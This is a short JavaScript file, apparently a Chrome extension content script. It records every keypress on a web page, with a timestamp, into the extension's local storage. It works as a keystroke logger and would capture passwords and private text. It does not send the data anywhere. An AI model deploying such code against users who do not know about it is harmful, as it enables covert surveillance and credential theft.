console.log("Keystroke tracker is active");

// Listen for keypresses
document.addEventListener("keydown", (event) => {
    const keyPressed = `${new Date().toISOString()} - Key pressed: ${event.key}\n`;

    // Retrieve existing keystrokes from storage
    chrome.storage.local.get(["keystrokes"], (result) => {
        const keystrokes = result.keystrokes || "";
        const updatedKeystrokes = keystrokes + keyPressed;

        // Save the updated keystrokes back to storage
        chrome.storage.local.set({ keystrokes: updatedKeystrokes });
    });
});